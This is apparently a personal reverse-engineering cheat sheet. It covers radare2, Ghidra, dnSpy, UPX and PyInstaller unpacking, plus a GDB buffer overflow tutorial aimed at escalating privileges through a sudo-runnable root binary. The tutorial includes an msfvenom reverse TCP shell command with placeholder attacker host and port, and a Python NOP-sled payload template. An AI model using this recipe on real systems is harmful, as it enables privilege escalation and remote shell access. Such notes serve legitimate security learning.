# Reverse Engineering
Everything that you need for about RE

# Radare2 (R2)
Manipulate binaries easily    
You can use R2 to overwrite parts of the assembly code so one part doesn't get called or gets redirected.

## Help
- [https://github.com/radareorg/radare2/blob/master/doc/intro.md](https://github.com/radareorg/radare2/blob/master/doc/intro.md)
- [https://man.archlinux.org/man/radare2.1.en](https://man.archlinux.org/man/radare2.1.en)


# Ghidra
Open source reverse engineering software developed by NSA

## Help
- [https://github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- [https://ghidra-sre.org/CheatSheet.html](https://ghidra-sre.org/CheatSheet.html)



# dnSpy
Used for disassembling .NET code

## Github
[https://github.com/dnSpy/dnSpy](https://github.com/dnSpy/dnSpy)



# GDB
GNU Debugger helps with debugging.    
When looking through a binary one might want to perfrom a buffer overflow attack, for which GDB is perfect.

## peda
Python Exploit Development Assistance for GDB

### Links
- [https://github.com/longld/peda](https://github.com/longld/peda)

## Basic buffer overflow
**This could be used if a binary is owned by root, but current user can run it with sudo**    
1. Start gdb with your desired binary
    ```bash
    $ gdb <bin>
    ```
2. Set breakpoint (usually main)
    ```
    (gdb) break <function / offset>
    ```
3. Generate a payload    
    *If the payload is not long / short enough you can always change the size*
    ```bash
    $ python -c 'print("A"*100)'
    ```
4. Run the binary in gdb and enter your payload
    ```
    (gdb) r
    
    Enter string: AAAAAAA...
    ```
    *If the program breaks, it's vulnerable to buffer overflow*
5. Finding the right size      
    Here I personally reduce the length of the paylod by half and if it breaks again repeat the steps.    
    If the program doesn't break, you found a shorter length than the input. Here one can go by increments of 1s or 5s     
    as they like and when the program breaks on a specific length they found the desired length.    
    You can see if the payload is loaded into the EIP register upon running `info registers` in gdb.
    1. If the payload is one less than the right size, the register will have one random HEX char at the end
    ```
    (gdb) info registers
    [snip]
    eip     <0x616162> 
    [snip]
    ```
    In the above code `62` is the random char. So, however long was the payload above, we need to add one more charcter to it.     
    For simplicity's sake let's say that the correct size was `512`.

6. Making the actual payload
    1. Finding the EIP address    
        Because the EIP has been overwritten, we don't know the return value of main.     
        So, now input the same payload into the program but take away the last four characters `AAAB` or `616162`.    
        After doing that one will see the return address of the EIP after running `info reg eip` in gdb.
    2. Make a shell code
        ```bash
        msfvenom --payload linux/x86/shell/reverse_tcp LHOST=<ip> LPORT=<port> --format py --bad-chars '\x00\x09\x20\x0a\xff' 
        ``` 
        The command above will give you a shell code to spawn a reverse tcp shell.    
        I didn't run the command so, I am going to assume its length so, let's make it `150` bytes long.      
        **OR**    
        Get a shellcode from here: [https://shell-storm.org/shellcode/index.html](https://shell-storm.org/shellcode/index.html) 
    3. Assemble the payload in Python     
        **Keep in mind that most system are storing data in little endian**    
        *This means that all addresses and bytes have to be reversed*
        ```python
        #!/usr/bin/python3

        # Sizes
        BUFFER      = 512
        SHELLCODE_L = 150
        RET_L       = 4
        NOP_L       = BUFFER - SHELLCODE_L - RET_L

        # Bytes
        SHELLCODE = b"YOUR SHELLCODE HERE"   # Reverse if little endian
        RET_ADDY  = b"YOUR RETURN ADDRESS"   # Reverse if little endian
        NOP_SLED  = b"\x90" * NOP_L

        print(NOP_SLED + SHELLCODE + RET_ADDY)
        ```
7. Running the program with the payload
    ```
    (gdb) r

    Enter string: <payload-here>
    ```

Hopefully this should spawn the attacker a reverse shell.

### References
- **Best help**    [**https://samsclass.info/127/proj/p3-lbuf1.htm**](https://samsclass.info/127/proj/p3-lbuf1.htm)
- [https://www.cyberpunk.rs/buffer-overflow-linux-gdb](https://www.cyberpunk.rs/buffer-overflow-linux-gdb)
- [https://shell-storm.org/shellcode/index.html](https://shell-storm.org/shellcode/index.html)


# UPX
If a binary is packed with `upx` used this to unpack it:
```bash
upx -d <binary>
```


# PyInstaller packed binaries
Python files can be packed and unpacked to and from a binary.    
Use the links below to unpack said binary.    

After unpacking the binary, use [uncompyle6](https://pypi.org/project/uncompyle6/) to decompile `.pyc` files gotten from the unpacking process.

## The extractor
[https://github.com/extremecoders-re/pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor)

### Help
[https://www.fortinet.com/blog/threat-research/unpacking-python-executables-windows-linux](https://www.fortinet.com/blog/threat-research/unpacking-python-executables-windows-linux)